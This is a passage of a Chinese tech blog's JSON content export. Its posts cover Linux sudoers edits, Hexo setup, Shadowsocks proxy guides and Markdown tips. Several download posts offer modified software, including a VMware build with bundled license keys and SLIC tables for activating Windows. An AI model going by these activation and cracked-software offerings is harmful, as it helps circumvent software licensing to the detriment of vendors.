~]# chmod u+w /etc/sudoers[root@zaza ~]# vim /etc/sudoers 在文件中间找到下面这行 12## Allow root to run any commands anywhere root ALL=(ALL) ALL 在下面加上自己的用户信息，然后保存即可 123## Allow root to run any commands anywhere root ALL=(ALL) ALLsobaigu ALL=(ALL) ALL 经过以上操作修改，老的用户名就改成新的了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Windows 10 无法安装.net framework解决办法","slug":"cant-install-net-framework-35-feature-0x800f0922","date":"2017-09-10T08:12:01.000Z","updated":"2017-09-10T08:12:01.000Z","comments":true,"path":"cant-install-net-framework-35-feature-0x800f0922.html","permalink":"https://sobaigu.com/cant-install-net-framework-35-feature-0x800f0922.html","excerpt":"","text":"问题现象 某些软件需要.net支持，本来安装这个也挺简单的，但在某个版本的Windows 10却不能顺利安装完成，即便是使用离线安装包也无法完成安装。 安装失败的代码都是0x800f0922，系统会提示让重启系统重新安装，但这些都是徒劳。 问题原因及解决办法 这个问题莫名其妙，错误提示也完全没提示到点上。最后看到在启用禁用Windows功能里还有个.NET Framework 4.6 ...。 这个在安装完操作系统就有了，将其取消勾选，点确认应用更改，然后再勾选.NET Framework 3.5安装就可以了。 参考文档 https://social.technet.microsoft.com/Forums/en-US/d689ea30-0054-4691-88df-1dac5549ffe2/cant-install-net-framework-35-feature-0x800f0922?forum=win10itprogeneral","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Hexo，从此开始...","slug":"start-with-good-hexo","date":"2017-09-05T07:15:40.000Z","updated":"2017-10-14T05:23:02.000Z","comments":true,"path":"start-with-good-hexo.html","permalink":"https://sobaigu.com/start-with-good-hexo.html","excerpt":"","text":"适用平台：Microsoft Windows 关键词： GoodHexo，Hexo绿色版，Hexo便携版，Hexo配置，Hexo，U盘携带，GitHub Hexo Hexo是一个快速、简洁且高效的博客框架，支持 Markdown 的绝大部分功能；具有超快生成速度，让数百个 MarkDown 源文件在几秒内快速渲染成全站 HTML 页面；还拥有各式各样的插件支持功能扩展。 但是就像很多教程里面写的那样，搭建 Hexo 本地环境，需要安装 Node.js、Git 以及使用 npm 进行安装和配置。这对于毫无经验的新手来说，是一个很大的挑战。同时，由于这些环境的存在，导致如果需要更换计算机的时候，重新安装配置一个新的Hexo环境，又得花费一些功夫。 所以呢，我们整合了一个 Hexo 便携版，来简化本地环境的部署，这就是我们的GoodHexo。 当你重装系统后，只要GoodHexo目录还在，直接接着用即可； 当你想换个电脑，只需要将GoodHexo目录移到新电脑上即可。甚至，你可以将这个文件夹装到U盘里，走哪插哪就行。 软件介绍 那么所谓的便携版到底是什么？便携版就是将 Hexo 本地环境所需要的各种依赖环境的整合到一起，做成不需要安装的版本。 当然，目前只有Windows版。 本便携版当前版本所包含的软件如下： Git: 2.7.4 Nodejs: 12.16.2 Npm: 6.14.4 Hexo: 4.2.0 为了便携的需要，不能配置固定的环境变量，所以除此之外还有相应的批处理脚本，下文将详细介绍。 GoodHexo下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘1 备用网盘2 提取码 good 8vsm 压缩包40多M，推荐从备用网盘下载 如果百度网盘慢，可以用这个第三方不限速的百度网盘下载器 从零开始，一分钟使用 GoodHexo 写作环境 说了这么多，我们这就开始教你如何在1分钟内，从零开始使用 GoodHexo 写作环境！ 目录结构 该订制的GoodHexo包基本上已经包含了Hexo博客所需的所有依赖，添加新主题新功能缺依赖的照提示去安装更新即可。 上面的压缩包下载解压后，其目录结构如下： 12345678910111213141516171819202122232425GOODHEXO| 1.新建文章.bat #要新建文章运行此批处理，填文件名建议别用中文| 2.本地测试.bat #写完文章可以启动本地服务端测试预览效果| 3.渲染并部署.bat #确定文章写完了，那么就运行此批处理发布| README.md #本便携包说明文档| 启动命令行.bat #给有经验的人用，直达bash界面| 清理旧文件后部署.bat #部署也没报错，但博客就是没更新或者其他异常，那么用这个来部署试试| +---hexo #hexo程序工作目录| | .gitignore #指定Git提交时忽略的文件规则，一般也不要动| | db.json #不要动| | package.json #不要动| | _config.yml #hexo的主配置文件，定义标题，作者，导航菜单等| | | +---node_modules #hexo的依赖环境，不要动| +---scaffolds #文章模板| +---source #网站根目录| | \\---_posts #你所有的文章都存在这个目录底下，通过批处理新建文章会自动建到这个目录下| | | hello-world.md #示例文章源文件，该MarkDown文件会被hexo渲染成HTML页发布| | | +---themes #主题存放目录| | \\---landscape #默认主题| | | \\---support #便携程序包，包含nodejs和Git，不要动 开始使用 详细个性化设置 拿到这个包，一些基础配置和基本的主题设置等院长都已经给你做好了，只需要自行对博客网站进行个性化详细设置即可。 个性化设置主要有两个地方： Hexo目录下的_config.yml ，详见相应的参数注释，按要求填写，不想写就默认 主题目录下的_config.yml ，主题不同设置项不同，所以请参考主题对应的文档进行修改设置 依次打开就能看个大概了，根据自己的需要及主题帮助完成自己要的个性化设置。更深入的个性化基本上需要在主题上做文章，请自行查看主题帮助，或者研究主题源代码即可完成。 修改的时候请注意格式，否则会导致错误而无法正常使用，比如 : 要是英文的且后面有内容的话至少要跟一个空格，配置内容跟后面的 # 注释之间至少要有一个空格，具体错误可以启动命令行输入 hexo s --debug 查看。 写一篇自己的文章 设置好后，就可以动手写自己的文章了。 step1.新建文章 运行1.新建文章.bat，按提示填写文章名称，建议不要使用中文。 回车确认后会在hexo目录下的对应目录新建个.md文件，文件名以刚才输入的文章名称命名，注意提示的文件路径和新创建的文件名，如hexo\\source\\_posts\\2017-09-start-with-good-hexo.md step2. 编辑文章MarkDown文件 使用任意文本编辑器打开你刚新建的文章MarkDown源文件，写你想写的内容即可，推荐编辑器首选用Atom或者vscode，关于编辑器以下文章可以阅读下： vscode-跨平台，绿色免费，基本接近完美的编辑器 MarkDown编辑器推荐这篇文章 基于Moeditor修改集成Hexo功能的编辑器 如果不依赖MarkDown编辑器，那么你需要掌握基本的MarkDown语法，然后就可以用任意文本编辑器【当然，Windows系统自带的记事本还是不推荐用】，按MarkDown语法写文档了。MarkDown语法可以参考这个教程。 需要额外注意的是：Hexo对MarkDown文档头有规范，就是在文档开始两个 --- 中间的那部分，官方称之为 Front-matter 123456789101112131415---title: &#x27;Hexo，从此开始...&#x27; #文章标题，新建文章的时候填的会自动写到这里date: 2018-1-12 17:19:27 #文章创建时间categories: #分类，可以直接跟在这后面，也可以如下一行这样换行后写分类- 搞软件 #这是个分类名称tags: #标签- 晒酷软 #这是个标签toc: true #是否显示目录，false不显示，true显示，需要主题支持top: #填数字，值越大的文章在首页就越置顶，本包已集成comments: true #是否允许评论，需要主题支持keywords: &#x27;&#x27; #文章关键词，需要主题支持description: &#x27;文章摘要，可以是一大段，可以换行，用英文引号括起来&#x27; #不填则根据主题设计截取对应字数---上面部分是规定的头部信息，这行开始就是文章内容了... 以上参数除了title:都不是必须的，请根据自己的需求填写，注意每一个参数的:或者-后，都需要至少留一个空格，如果不填值就无所谓，或者将参数行删除都行，就是不能不留空格直接写，否则会报错。 如果参数值中间涉及特殊字符或者空格等，请使用英文的单引号 '' 将你的内容括起来，就如上面的示例一样。 更多 Front-matter 参数详见官方文档：https://hexo.io/zh-cn/docs/front-matter.html 文章参数设置完后，就可以在 --- 下一行写自己想写的任何内容了，以下都属于你文章的内容。 step3.渲染并发布 文章写好保存，那就运行3.渲染并部署.bat，该批处理会将你的MarkDown源文件套用主题模板渲染成HTML静态页，并把静态页部署到网站空间，最后提示 deploy done：git 就表示已部署完成，要不了半分钟，访问你的网站地址就能看到效果了。 以上步骤请仔细阅读，再写新文章，重复以上步骤即可。 使用过程中可能会遇到一些问题，请参考我整理的：GoodHexo使用常见问题及解决办法。 进阶教程 如果你喜欢折腾，Hexo进阶部署使用可以参考Hexo博客Git-VPS部署完整记录。 使用过程中如需帮助，欢迎评论交流。 备注 本文所有权归 搜百谷 所有； 本便携版由 凹凸曼 维护并提供技术支持；","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Shadowsocks使用一文通","slug":"how-to-use-shadowsocks-all-in-one","date":"2017-09-01T06:30:21.000Z","updated":"2017-09-01T06:30:21.000Z","comments":true,"path":"how-to-use-shadowsocks-all-in-one.html","permalink":"https://sobaigu.com/how-to-use-shadowsocks-all-in-one.html","excerpt":"","text":"前言 上网还需要懂科学这事，是解放区的特色。 很多同学想看看外面的世界，但又不知道怎么看。鉴于在QQ上，微信里教过很多次，但仍然需要重复教，整理下自己知道的，希望今后有这一篇教程就够了。 谨以此文献给有需要了解墙外谣言的同学，但请时刻保持清晰的头脑，始终要记住：解放区的天是最蓝的，解放区的水是最甘甜的，解放区的空气是最清新的，人民公仆殚精竭力为人民，一切坏消息都是敌对势力用来蛊惑民心的！千万千万要提醒国人：帝国主义亡我之心不死！ 基本原理 代理技术及软件有很多，其中SS【shadowsocks简称】是首选。 Shadowsocks是一款开源软件，可运行在主流的各种设备上，其基本原理如下图： 从上面的原理图可见，穿越功夫网的是SS客户端和服务端通讯数据，我们的数据都通过SS进行了代理转发，功夫网也是可以知道两个端在通讯，但没法对数据解密，也就不知道通讯内容了。当然，如果SS服务器干过坏事被记录在案，那功夫网也不必知道具体内容，直接把服务器封了就了事了。所以爬过墙头，看看就好，别留下什么痕迹，别留下什么故事。 会看这篇教程的人，相信也没几个希望了解背后的原理，万一有好奇心想知道详情，更多细节直接去看这篇文章：写给非专业人士看的 Shadowsocks 简介 所需软件 服务端 需要不受功夫网监视的环境【服务器需要在墙外，否则这代理就没有任何意义】，用来加密中转被敏感的网站及其内容。 客户端 各平台的客户端，用来和服务端进行加解密通讯。 浏览器扩展【非必须】 在某些客户端功能不甚完善时，如Linux下的SS客户端不带PAC规则，此时借助浏览器扩展可以实现按需代理，以前写过一段，详见：爬墙之Switchysharp for Chrome 代理服务端 要使用SS服务，首先就需要一个可用的SS帐号，可以在网上免费获取或购买付费的专业服务，还可以自己搭建服务器。能够免费获取或者买到的是别人搭建好的服务端，我们客户端填账号密码连接就可以了。 如果爱折腾，用买SS账号的钱完全可以自己管理个VPS，可能还更便宜，还可以做网站服务器等他用，比起免费的资源不稳定，公共的IP容易被封，买个VPS搭建服务端私有专用更好。在VPS上搭建SS服务端可参考：CentOS_Debian搭建shadowsocks-libev服务端 如果想给多人区分账号使用，则可以参考这两个教程：数据库多用户教程，json版多用户教程（仅一台服务器适用） 如果你买的是搬瓦工的VPS，那么也不需要自己安装SS服务端了，直接在后台可以一键启用SS即可：进入搬瓦工后台&gt;KiwiVM Control Panel，左侧菜单拉到最底部，就看到shadowsocks server的入口了，按提示启用即可，注意启用的端口，密码，加密方式等，一会儿客户端要用到。 如果没有国外的VPS资源，可以找一些免费的资源使用。 代理客户端 服务端准备好后，剩下的就是在自己的电脑上装上对应的客户端使用。 PC端 Windows-软件介绍及下载地址 Linux-软件使用说明 MacOS-软件使用说明 手机端 Android-软件介绍及下载地址 IOS-软件使用说明 进阶使用 shadowsocks客户端添加PAC自定义规则","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"MarkDown文档中怎么让图片并排展示","slug":"images-side-by-side-in-markdown","date":"2017-08-23T07:15:40.000Z","updated":"2017-08-23T07:15:40.000Z","comments":true,"path":"images-side-by-side-in-markdown.html","permalink":"https://sobaigu.com/images-side-by-side-in-markdown.html","excerpt":"","text":"Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的HTML页面。 Markdown 语法是对纯文本格式的强化，能使文本显示得更清晰、有条理。但它依旧算是简单的文本，很容易修改和扩展，常用于快速写作中。也正是因为MarkDown更注重简洁，所以对于图文混排，一些特定效果等功能进行了弱化，比如想设置图文并列，图片墙等时，纯MarkDown语法就无法实现了。 还好，Markdown 格式的兼容扩展性颇佳，使之能快速转换为各种互联网上的常用格式，比如 HTML、Word、PDF 等。 所以要实现图文混排，我们可以使用HTML语法来完成，比如完成一个图片并列排放效果，就可以在MarkDown文档中直接写入如下示例代码实现 123&lt;div style=&quot;float:left;border:solid 1px 000;margin:2px;&quot;&gt;&lt;img src=&quot;../images/QR-BTC.png&quot; width=&quot;200&quot; height=&quot;260&quot; &gt;&lt;/div&gt;&lt;div style=&quot;float:left;border:solid 1px 000;margin:2px;&quot;&gt;&lt;img src=&quot;../images/QR-BTC.png&quot; width=&quot;200&quot; height=&quot;260&quot; &gt;&lt;/div&gt; 以上示例代码实现的效果如下： 当屏幕容得下多张图片时，图片将并排展示，如果屏幕分辨率小，则接着下一屏展示。 如上文，当添加了`DIV`样式后，图片是实现并排了，可后面的文字也贴上去了，无法实现在下一行显示，此时我们就需要在将下文放在`DIV`容器中，并清除之前的浮动样式 123&lt;div style=&quot;float:none;clear:both;&quot;&gt;下文其他内容&lt;/div&gt; 参考文档：http://whuhan2013.github.io/blog/2015/09/19/markdown-simple-grammar/","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Linux下安装使用Shadowsocks","slug":"how-to-use-shadowsocks-linux","date":"2017-08-10T06:30:21.000Z","updated":"2017-08-10T06:30:21.000Z","comments":true,"path":"how-to-use-shadowsocks-linux.html","permalink":"https://sobaigu.com/how-to-use-shadowsocks-linux.html","excerpt":"","text":"Linux有很多版本，但都大同小异，此处以ubuntu为例。 在Ubuntu下安装SS很简单。只需要依次执行下面3条命令： 123apt-get updateapt-get install python-pippip install shadowsocks pip 是 python 下的方便安装的工具，类似 apt-get。 全部执行完毕且没有报错的话，我们的 shadowsocks 就算是装完了。接下来就是配置部署了。 写一个配置文件保存为etc/shadowsocks.json，文件内容如下： 12345678910&#123; &quot;server&quot;:&quot;my_server_ip&quot;, &quot;server_port&quot;:8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;mypassword&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false&#125; server, server_port, password 需要自行根据自己的实际情况修改。 配置文件编辑完成后，接下来就可以部署运行了： 1ss-local -c /etc/shadowsocks.json -d start 当然，我们可不希望每次重启服务器都手动启动 SS, 因此我们要把这条命令放到这个文件下：/etc/rc.d/rc.local，这样以后就能开机自动运行了。 好了，打开浏览器，配合浏览器扩展呼吸墙外的空气吧：爬墙之Switchysharp for Chrome 如果想免扩展实现Windows下客户端的按pac规则，可以自行搜索，还需要另外一个程序来完成pac更新，实际使用不太好使。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"那好吧-宅男福利","slug":"android-player-nahaoba","date":"2017-08-06T09:53:25.000Z","updated":"2017-08-13T09:53:25.000Z","comments":true,"path":"android-player-nahaoba.html","permalink":"https://sobaigu.com/android-player-nahaoba.html","excerpt":"","text":"基本信息 程序类型：安装绿色特别版 界面语言：中文英文 文件大小：2.9 m 支持系统：Android 官方主页： 软件介绍 那好吧安卓版是一款P2P聚合播放神器、宅男神器！体积小巧、资源占用低、扩展能力强，扩展资源多、支持第三方、先锋影音、西瓜影音等网络媒体的在线播放影视，缓冲速度极快。随心随意让你想看的那种视频及图片播放，大家懂得！ 搜索栏输入“1024”获取你想要的！配合科学上网更爽！悄悄的低调下载吧！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6izx","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"MarkDown编辑器推荐","slug":"software-markdown-editor","date":"2017-08-04T05:59:11.000Z","updated":"2017-08-04T05:59:11.000Z","comments":true,"path":"software-markdown-editor.html","permalink":"https://sobaigu.com/software-markdown-editor.html","excerpt":"","text":"Markdown 是一种轻量级标记语言，它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的 XHTML（或者 HTML）文档”。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性，很容易转换为 HTML 文档或其他格式，适合用来编写文档、记录笔记、撰写文章。 虽说MarkDown几乎可以在所有的文本编辑器中编写，但一款顺手的MarkDown编辑器总能让你事半功倍。整理了自己喜欢的，认为好用的几款编辑器，总有一款适合你。 以下编辑器都很优秀，但vscode更接近个人期待的编辑器的样子，见：vscode-跨平台，绿色免费，基本接近完美的编辑器 1.Typora Typora是款很优雅的MarkDown编辑器，界面小清新，功能也很贴近实际使用，尤其喜欢的是所见即所得编辑，快捷插入图表等功能，PC各平台都有版本，强烈推荐。 唯一遗憾的是不支持目录管理，如果能像atom一样支持目录及Git管理就完美了。 2.Atom Atom不是为MarkDown而生，但原生支持MarkDown，有各种丰富的插件支持，优点是天然结合Git，代码高亮等编程常用功能。但作为MarkDown编辑器推荐时，缺点也显而易见：体积大，启动慢，不支持MarkDown快捷代码实现功能。 也是可以跨平台的，而且开源，ubuntu上官网只提供64位版本，32位Ubuntu系统安装atom见此处 3.Moeditor 跨所有平台，免费且开源的软件，小清新风格界面简洁的MarkDown编辑器，可分栏实时预览最终效果，也是不支持目录管理。 4.Cmd Markdown Cmd Markdown 是一款使用 Web 技术开发的，全面且强大的 Markdown 编辑器。它拥有实时预览、离线编辑、智能同步、发布共享等功能，并提供了 Web 版和 Windows、OSX、Linux 平台的客户端，体验很棒。但该工具需要注册账号才能使用，无账号导出功能受限制。 5.MarkdownPad MarkdownPad 是一款 Windows 平台上的 Markdown 编辑器，提供了多文件编辑、实时预览、自定义样式、文件导出等功能。提供了免费版本和包含高级功能的 Pro 付费版（版本对比），支持多国语言。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"}]},{"title":"VMware Workstation-精简优化注册版","slug":"software-system-VMware-Workstation","date":"2017-07-30T08:55:00.000Z","updated":"2017-07-30T08:55:49.000Z","comments":true,"path":"software-system-VMware-Workstation.html","permalink":"https://sobaigu.com/software-system-VMware-Workstation.html","excerpt":"","text":"基本信息 程序类型：安装绿色特别版 界面语言：中文英文 文件大小：198 m 支持系统：Windows/Linux 官方主页：www.vmware.com/cn.html 软件介绍 VMware Workstation允许操作系统(OS)和应用程序(Application)在一台虚拟机内部运行。虚拟机是独立运行主机操作系统的离散环境。在 VMware Workstation 中，你可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。你可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机(例如一个公司局域网)，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。 该版由网友@cuiplay专注精简制作，集成包含SLIC2.4、MSDM、OSX同时改了EFI BIOS；集成许可证密钥安装完自动永久激活！另外，该版最大特色是添加了DELL SLIC 2.4，号称世界史上第一位解决！喜欢精简版的不容错过！ 修改了 EFI BIOS 添加上 DELL SLIC 2.4 世界史上第一位解决！ 可以激活Windows XP、2003、2003R2、Vista、2008、Win7、2008R2、2012、2012R2 VISTA~2012R2对安装盘无要求，导入证书和CDK即可激活（网盘已提供） 如需安装 Mac OS X，设置VM兼容性10，修改 .vmx 添加： smc.version = “0″ 如需安装 服务器版本的 Mac OS X Leopard、Snow Leopard 10.5及后续版本 如上设置，并且使用 EFI BIOS，编辑虚拟机设置 – 选项 – 高级 – 勾选“通过 EFI 而非 BIOS 引导” 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 wosj","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Andriod手机上Shadowsocks设置使用教程","slug":"how-to-use-shadowsocks-andriod","date":"2017-07-28T06:30:21.000Z","updated":"2017-07-28T06:30:21.000Z","comments":true,"path":"how-to-use-shadowsocks-andriod.html","permalink":"https://sobaigu.com/how-to-use-shadowsocks-andriod.html","excerpt":"","text":"基本信息 程序类型：安装特别版 界面语言：中文英文 文件大小： m 支持系统：Android 官方主页： 软件介绍 Shadowsocks是一款可协助网友畅游网络的客户端小工具，功能非常强大，需要注意的是它需要服务器端配合才能发挥作用，你需自行搭建服务器端程序，配置好IP和密码等信息并启用服务后即可网络加速。 功能更为强大但客户端使用可能更复杂的SSR使用说明请点此查看 本文下载地址中提供的是Shadowsocks原版客户端去广告版本，安全好用。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 GitHub源 BitTorrent Sync 提取码 hn5i 软件安装及配置 选一个自己喜欢的版本客户端，安装下载的apk文件【建议“ShadowsocksR”】，安装完成后启动“影梭”或者“Shadowsocks”或者“SSRR”，首先我们需要配置代理账号信息，可以手动填账号密码等，也可以扫描二维码来实现。 方式1：扫描二维码 新安装默认会打开配置文件界面，点击右上角的加号&gt;扫描二维码，可能会提示你安装二维码扫描器，按提示安装然后扫描Shadowsocks账号二维码即可。 如果不想安装扫描软件，则自己手动去填写账号密码，使用方式2。 方式2：手动填写 还是刚才右上角那个加号&gt;点击手动设置，填写上Shadowsocks服务器地址，端口，密码和加密方式。 每个选项点击后都将弹出输入或者选择框 点击浮在界面上的小飞机图标开始连接，如果会有系统提示，那么请勾选我信任此软件，点确定。连接成功后，一般在顶部状态栏会出现一把锁的图标，此时打开你喜欢的应用吧，比如twitter、instagram，非死不可，油土鳖这些世界上不存在的网站就可以访问了。 后台服务启动失败 图就不贴了，多在华为手机上出现，提示如下： 后台服务启动失败：服务器名无效 华为手机，安装完Shadowsocks后，在软件默认配置上改的会出现，原因不知道，我也没华为手机，新建个配置使用尝试下，如果有提示请仔细阅读，一些权限请允许…… 注意事项 路由配置有多种模式，全局就表示所有流量都要过代理，其他就顾名思义，根据自己的需要选择路由模式，一般选择仅代理中国大陆无法访问的地址即可，能访问的就没必要过代理，也能避免不必要的流量浪费。 Tips1 无需root即可使用 Tips2 浏览器和App都可以代理，比系统自带的VPN客户端效果好多了","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"WinHex-16进制文件编辑-数据恢复利器","slug":"software-other-winhex","date":"2017-07-25T08:31:13.000Z","updated":"2017-07-25T08:31:13.000Z","comments":true,"path":"software-other-winhex.html","permalink":"https://sobaigu.com/software-other-winhex.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：1.7 m 支持系统：Windows 官方主页：www.x-ways.net 软件介绍 WinHex是16进制文件编辑器与磁盘编辑必备软件！它文件小、速度快，功能不输其它Hex十六进位编辑器利器。可做Hex与ASCII码编辑修改，多文件寻替换功能，一般运算及逻辑运算，磁盘磁区编辑 (支持FAT16、FAT32和NTFS)自动搜寻编辑，文件比对和分析，RAM编辑功能等功能。 WinHex 曾经和 UltraEdit 编辑器齐名，但后来两者发展路线截然不同，UltraEdit做了全功能编辑器，而WinHex的功能更加趋于检查和修复各种文件、恢复删除文件、硬盘损坏造成的数据丢失等。利用WinHex可看到其他程序隐藏起来的文件和数据。而且其同样是非常不错的16进制编辑器。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 p4vt","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"PC Hunter-系统信息分析查看及维护工具","slug":"software-system-pchunter","date":"2017-07-19T08:10:36.000Z","updated":"2017-07-19T08:10:36.000Z","comments":true,"path":"software-system-pchunter.html","permalink":"https://sobaigu.com/software-system-pchunter.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：7.0 m 支持系统：Windows 官方主页：www.epoolsoft.com 软件介绍 PC Hunter是功能强大的Windows系统信息分析查看及维护工具，同时也是强大的手工杀毒利器，用它不但可以查看各类系统信息，也可以揪出电脑中潜伏的病毒木马，是不可多得的一款辅助分析工具。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 rtki","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"搜狗拼音输入法-精简优化版","slug":"software-system-sogouinput","date":"2017-07-15T07:55:46.000Z","updated":"2017-07-15T07:55:46.000Z","comments":true,"path":"software-system-sogouinput.html","permalink":"https://sobaigu.com/software-system-sogouinput.html","excerpt":"","text":"基本信息 程序类型：安装特别版 界面语言：中文英文 文件大小：23 m 支持系统：Windows 官方主页：pinyin.sogou.com 软件介绍 搜狗拼音输入法是电脑装机必备软件，版本有传统版和智慧版之分，其打字超准、词库超大、速度飞快、外观漂亮，因此使得输入操作变得事半功倍。精简的版本用着舒适！ 关于精简优化版 zd423、大水牛专注精简优化，彻底免升级更新，砍掉了多余功能、无微门户弹窗、无勋章相关推荐、无推广软件渣行为，无多余干扰提示，无多余进程驻留，可选安装个人中心和联网组件，让你安心舒适的打字！删除了云候选程序、勋章推荐组件、搜索候选组件、辅助工具模块、升级服务程序、网络更新模块、崩溃反馈程序，图片表情、皮肤推荐、皮肤盒子、flash皮肤等组件，可自行在工具箱添加应用；完美支持Windows 32、64位系统，支持Win8.1/10 Metro模式，支持检测覆盖安装！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 